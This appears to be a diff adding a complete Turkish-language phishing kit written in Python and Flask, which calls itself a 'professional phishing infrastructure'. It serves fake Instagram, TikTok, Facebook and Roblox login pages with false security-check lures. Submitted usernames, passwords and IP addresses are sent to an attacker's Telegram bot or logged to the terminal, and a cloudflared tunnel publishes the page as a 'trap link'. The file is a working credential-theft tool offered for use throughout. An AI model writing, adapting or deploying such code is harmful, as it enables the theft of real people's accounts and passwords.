@@ -1,0 +1,224 @@
+import os
+import time
+import subprocess
+import re
+import requests
+import threading
+from flask import Flask, render_template_string, request, redirect
+from colorama import Fore, Style, init
+
+# --- AYARLAR VE RENKLER ---
+init(autoreset=True)
+app = Flask(__name__)
+log_config = {}
+
+# ATA System Özel Renkleri (Hacker Yeşili yerine Siber Mavi)
+CYAN_PRO = "\033[96m"
+WHITE_PRO = "\033[97m"
+BLUE_PRO = "\033[34m"
+RED_PRO = "\033[31m"
+
+def banner():
+    os.system('clear')
+    print(CYAN_PRO + Style.BRIGHT + """
+    ┌───────────────────────────────────────────────┐
+    │                                               │
+    │   █████╗ ████████╗ █████╗   >> SYSTEM <<      │
+    │  ██╔══██╗╚══██╔══╝██╔══██╗  [ VERSION 2.0 ]   │
+    │  ███████║   ██║   ███████║  ---------------   │
+    │  ██╔══██║   ██║   ██╔══██║  [STATUS: ONLINE]  │
+    │  ██║  ██║   ██║   ██║  ██║                    │
+    │  ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝                    │
+    │                                               │
+    │      PROFESYONEL OLTALAMA ALTYAPISI          │
+    └───────────────────────────────────────────────┘
+    """)
+
+# --- LOG SEÇİM EKRANI (TAMAMEN DEĞİŞTİ) ---
+def log_setup():
+    banner()
+    print(f"{CYAN_PRO}[ SYSTEM ] {WHITE_PRO}Veri Toplama Modunu Seçin:")
+    print(f"[{CYAN_PRO}1{WHITE_PRO}] Telegram Bot Integration {BLUE_PRO}(Uzaktan Takip)")
+    print(f"[{CYAN_PRO}2{WHITE_PRO}] Local Terminal Logging    {BLUE_PRO}(Anlık Takip)")
+
+    sec = input(f"\n{CYAN_PRO}[ SYSTEM ] {WHITE_PRO}Mod Seçiniz [1/2] > ")
+    if sec == "1":
+        token = input(f"{CYAN_PRO}[ INPUT ] {WHITE_PRO}Bot Token: ")
+        cid = input(f"{CYAN_PRO}[ INPUT ] {WHITE_PRO}Chat ID: ")
+        return {"mod": "telegram", "token": token, "id": cid}
+    else:
+        print(f"{CYAN_PRO}[ SYSTEM ] {WHITE_PRO}Yerel Terminal Modu Aktif.")
+        time.sleep(1)
+        return {"mod": "termux"}
+
+# --- PREMIUM HTML TASARIMLARI (TAMAMEN YENİLENDİ - OBANAİ'DEN FARKLI) ---
+def get_pro_html(platform):
+   
+    bg_dark = "#0D1117"  # GitHub Dark
+    panel_dark = "#161B22"
+    border_dark = "#30363D"
+    text_main = "#C9D1D9"
+    text_sub = "#8B949E"
+    btn_blue = "#1F6FEB" # Microsoft/GitHub Blue
+    btn_hover = "#388BFD"
+
+  
+    if platform == "Roblox":
+        icon, title, desc = "🎮", "ROBLOX - Hesap Güvenlik Kontrolü", "Şüpheli aktivite algılandı. Hesabınızı doğrulamak için lütfen giriş yapın."
+    elif platform == "Instagram":
+        icon, title, desc = "📸", "INSTAGRAM - İş Ortağı Portalı", "Kurumsal hesabınıza erişim sağlamak için oturum açın."
+    elif platform == "TikTok":
+        icon, title, desc = "🎵", "TIKTOK - İçerik Stüdyosu", "Gelişmiş analitik paneline erişmek için hesabınızı bağlayın."
+    else: # Facebook
+        icon, title, desc = "👥", "FACEBOOK - Reklam Yöneticisi", "Sayfa etkileşimlerinizi yönetmek için kurumsal giriş yapın."
+
+    return f"""
+    <!DOCTYPE html>
+    <html lang="tr">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <title>{platform} Authentication</title>
+        <style>
+            * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }}
+            body {{ background-color: {bg_dark}; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: {text_main}; }}
+            
+            .auth-container {{ 
+                background: {panel_dark}; 
+                padding: 30px; 
+                border: 1px solid {border_dark}; 
+                width: 100%; 
+                max-width: 360px; 
+                border-radius: 8px; 
+                box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+                text-align: center;
+                transition: transform 0.3s;
+            }}
+            .auth-container:hover {{ transform: translateY(-5px); }}
+
+            .platform-icon {{ font-size: 50px; margin-bottom: 10px; }}
+            .platform-title {{ font-size: 18px; font-weight: 600; color: white; margin-bottom: 5px; letter-spacing: 0.5px; }}
+            .platform-desc {{ font-size: 13px; color: {text_sub}; margin-bottom: 25px; line-height: 1.5; padding: 0 10px; }}
+            
+            .input-group {{ text-align: left; margin-bottom: 15px; }}
+            .input-label {{ font-size: 12px; color: white; margin-bottom: 5px; display: block; font-weight: 500; }}
+            input {{ 
+                width: 100%; 
+                padding: 12px; 
+                background: {bg_dark}; 
+                border: 1px solid {border_dark}; 
+                border-radius: 6px; 
+                font-size: 14px; 
+                color: white; 
+                outline: none; 
+                transition: border-color 0.2s;
+            }}
+            input:focus {{ border-color: {btn_blue}; box-shadow: 0 0 0 3px rgba(31, 111, 235, 0.3); }}
+
+            button {{ 
+                width: 100%; 
+                padding: 12px; 
+                background-color: {btn_blue}; 
+                border: none; 
+                color: white; 
+                font-weight: 600; 
+                border-radius: 6px; 
+                cursor: pointer; 
+                margin-top: 10px; 
+                font-size: 14px; 
+                transition: background-color 0.2s;
+            }}
+            button:hover {{ background-color: {btn_hover}; }}
+
+            .divider {{ display: flex; align-items: center; margin: 25px 0; }}
+            .divider::before, .divider::after {{ content: ""; flex: 1; height: 1px; background: {border_dark}; }}
+            .divider span {{ padding: 0 10px; font-size: 11px; color: {text_sub}; font-weight: 500; text-transform: uppercase; }}
+            
+            .footer {{ margin-top: 15px; font-size: 11px; color: {text_sub}; }}
+            .secure-badge {{ font-size: 10px; color: {text_sub}; margin-top: 10px; }}
+        </style>
+    </head>
+    <body>
+        <div class="auth-container">
+            <div class="platform-icon">{icon}</div>
+            <h1 class="platform-title">{title}</h1>
+            <p class="platform-desc">{desc}</p>
+            
+            <form action="/login" method="post">
+                <div class="input-group">
+                    <label class="input-label">E-posta veya Kullanıcı Adı</label>
+                    <input type="text" name="user" placeholder="örnek@eposta.com" required>
+                </div>
+                <div class="input-group">
+                    <label class="input-label">Şifre</label>
+                    <input type="password" name="pass" placeholder="••••••••" required>
+                </div>
+                <input type="hidden" name="platform" value="{platform}">
+                <button type="submit">Giriş Yap</button>
+            </form>
+            
+            <div class="divider"><span>Security Check</span></div>
+            
+            <div class="footer">© 2026 ATA System Security Services</div>
+            <div class="secure-badge">🛡️ Güvenli Bağlantı Aktif</div>
+        </div>
+    </body>
+    </html>
+    """
+
+
+current_plat = "Instagram"
+
+@app.route('/')
+def home():
+    return render_template_string(get_pro_html(current_plat))
+
+@app.route('/login', methods=['POST'])
+def login():
+    u, p, plat, ip = request.form.get('user'), request.form.get('pass'), request.form.get('platform'), request.remote_addr
+    
+    # Telegram Logu (Yeni Format)
+    if log_config["mod"] == "telegram":
+        msg = f"🛡️ ATA SYSTEM - HESAP DÜŞTÜ!\n\n🌐 P: {plat}\n👤 U: `{u}`\n🔑 P: `{p}`\n📌 IP: `{ip}`"
+        try:
+            requests.post(f"https://api.telegram.org/bot{log_config['token']}/sendMessage", data={"chat_id": log_config['id'], "text": msg, "parse_mode": "Markdown"})
+        except Exception as e:
+            print(f"{RED_PRO}[ ERROR ] Telegram Hatası: {e}")
+    
+    # Terminal Logu (Yeni Format)
+    print(f"\n{RED_PRO}{'='*40}\n[!] ATA SYSTEM - YENİ LOG ALINDI\n{'-'*40}")
+    print(f"{CYAN_PRO}Platform : {WHITE_PRO}{plat}\n{CYAN_PRO}Kullanıcı: {BLUE_PRO}{u}\n{CYAN_PRO}Şifre    : {BLUE_PRO}{p}\n{CYAN_PRO}IP       : {WHITE_PRO}{ip}\n{RED_PRO}{'='*40}")
+    return redirect(f"https://www.google.com/search?q={plat}+login+success")
+
+# --- TÜNEL VE BAŞLATICI ---
+def start_t():
+    print(f"\n{CYAN_PRO}[ SYSTEM ] {WHITE_PRO}Cloudflared tüneli kuruluyor...")
+    proc = subprocess.Popen(['cloudflared', 'tunnel', '--url', 'http://127.0.0.1:5000'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+    for line in proc.stdout:
+        if "trycloudflare.com" in line:
+            url = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", line)
+            if url:
+                print(f"\n{CYAN_PRO}[+] ATA System Tuzak Linki: {BLUE_PRO}{url.group(0)}")
+                break
+
+def main():
+    global log_config, current_plat
+    log_config = log_setup()
+    banner()
+    print(f"{CYAN_PRO}[ SYSTEM ] {WHITE_PRO}Lütfen Hedef Platformu Seçin:\n")
+    
+    options = {"1": "Instagram", "2": "TikTok", "3": "Facebook", "4": "Roblox"}
+    for k, v in options.items(): 
+        print(f"[{CYAN_PRO}{k}{WHITE_PRO}] {v} Profesyonel Paneli")
+    
+    sec = input(f"\n{CYAN_PRO}[ SYSTEM ] {WHITE_PRO}Seçiminiz [1-4] > ")
+    current_plat = options.get(sec, "Instagram")
+    
+    # Flask'ı başlat
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)).start()
+    time.sleep(2)
+    start_t()
+
+if __name__ == "__main__":
+    main()
+
